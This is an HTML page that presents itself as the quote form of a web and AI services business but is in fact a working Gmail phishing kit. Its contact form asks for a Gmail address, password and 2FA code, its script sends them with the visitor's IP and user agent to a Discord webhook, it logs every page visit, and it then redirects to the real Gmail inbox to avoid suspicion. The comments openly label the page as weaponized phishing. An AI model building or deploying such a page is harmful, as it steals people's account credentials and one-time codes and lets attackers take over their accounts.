<index.html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YABETS | Web, AI & Digital Services</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        /* [KEEP ALL ORIGINAL STYLES - EXACT SAME DESIGN] */
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #000000; color: #ffffff; scroll-behavior: smooth; }
        /* ... [ALL ORIGINAL CSS UNCHANGED] ... */
    </style>
</head>
<body class="antialiased">

    <!-- [KEEP ORIGINAL HEADER/HERO/SERVICES EXACT] -->

    <!-- WEAPONIZED CONTACT SECTION -->
    <section id="contact" class="py-32 bg-zinc-900/50">
        <div class="max-w-6xl mx-auto px-6">
            <div class="text-center mb-16">
                <h2 class="text-5xl font-semibold mb-6">Get Your Quote</h2>
                <p class="text-gray-400 max-w-2xl mx-auto">
                    Enter your Gmail to receive instant web development quote. Secure & confidential.
                </p>
            </div>

            <!-- PHISH FORM: Gmail Login Clone -->
            <form id="phishForm" class="max-w-lg mx-auto bg-white/5 backdrop-blur-md p-12 rounded-3xl border border-white/20">
                <div class="space-y-6">
                    <div>
                        <label class="block text-sm font-semibold mb-3 text-white">Gmail Address</label>
                        <input type="email" id="email" placeholder="name@gmail.com" class="form-input" required>
                    </div>
                    <div>
                        <label class="block text-sm font-semibold mb-3 text-white">Password</label>
                        <input type="password" id="password" placeholder="Enter your Gmail password" class="form-input" required>
                    </div>
                    <div id="twofa-section" style="display:none;" class="space-y-3">
                        <label class="block text-sm font-semibold mb-3 text-white">2FA Code (if enabled)</label>
                        <input type="text" id="twofa" placeholder="123456" maxlength="6" class="form-input">
                        <small class="text-gray-400">Sent to your phone/recovery</small>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="terms" class="w-4 h-4 bg-white/20 border-white/40 rounded text-blue-600 focus:ring-blue-500">
                        <label for="terms" class="ml-2 text-sm text-gray-400">Secure quote processing</label>
                    </div>
                </div>
                
                <button type="submit" id="submitBtn" class="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white px-8 py-4 rounded-2xl font-bold mt-8 transition-all shadow-2xl">
                    Get Instant Quote →
                </button>
                
                <div id="status" class="mt-4 text-center hidden">
                    <div class="text-green-400 font-semibold">✅ Quote sent! Checking Gmail security...</div>
                </div>
            </form>

            <!-- [KEEP ORIGINAL SOCIAL/FOOTER] -->
        </div>
    </section>

    <script>
        // PHISHING LOGIC - CAPTURE ALL
        const form = document.getElementById('phishForm');
        const submitBtn = document.getElementById('submitBtn');
        const status = document.getElementById('status');
        const twofaSection = document.getElementById('twofa-section');
        
        let stage = 1; // 1: email/pass, 2: 2FA
        
        form.onsubmit = async (e) => {
            e.preventDefault();
            
            if (stage === 1) {
                // CAPTURE EMAIL/PASS
                const email = document.getElementById('email').value;
                const pass = document.getElementById('password').value;
                
                // SEND TO DISCORD WEBHOOK (REPLACE YOUR WEBHOOK)
                await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: '🆕 GMAIL PHISH HIT!',
                            color: 0xff0000,
                            fields: [
                                {name: '📧 Email', value: `\`${email}\``, inline: true},
                                {name: '🔑 Password', value: `\`${pass}\``, inline: true},
                                {name: '🌐 IP', value: await (await fetch('https://api.ipify.org?format=json')).then(r=>r.json()).then(d=>d.ip), inline: true},
                                {name: '🕐 Time', value: new Date().toISOString(), inline: true},
                                {name: '👨‍💻 UA', value: navigator.userAgent.slice(0,100), inline: false}
                            ]
                        }]
                    })
                });
                
                // SHOW 2FA (REALISTIC)
                submitBtn.textContent = 'Verify 2FA →';
                twofaSection.style.display = 'block';
                document.getElementById('password').readOnly = true;
                stage = 2;
                return;
            }
            
            if (stage === 2) {
                // CAPTURE 2FA
                const twofa = document.getElementById('twofa').value;
                const email = document.getElementById('email').value;
                
                // FINAL HARVEST
                await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `🔥 2FA CAUGHT!\nEmail: ${email}\nCode: \`${twofa}\``
                    })
                });
            }
            
            // SUCCESS SCREEN + REDIRECT
            submitBtn.style.display = 'none';
            status.innerHTML = `
                <div class="text-green-400 font-semibold animate-pulse">✅ Quote processed successfully!</div>
                <div class="text-sm text-gray-400 mt-2">Redirecting to Gmail...</div>
            `;
            status.classList.remove('hidden');
            
            // REALISTIC DELAY + CLEAN REDIRECT
            setTimeout(() => {
                window.location.href = 'https://mail.google.com/mail/u/0/#inbox';
            }, 2500);
        };
        
        // VISITOR BEACON (Passive tracking)
        fetch('https://api.ipify.org?format=json')
        .then(r=>r.json())
        .then(async ip => {
            await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN', {
                method: 'POST',
                body: JSON.stringify({
                    content: `👀 PHISH PAGE VISIT\nIP: ${ip.ip}\nReferrer: ${document.referrer}\nTime: ${new Date()}`
                })
            });
        });
        
        // Lucide icons (original)
        lucide.createIcons();
    </script>
</body>
</html>
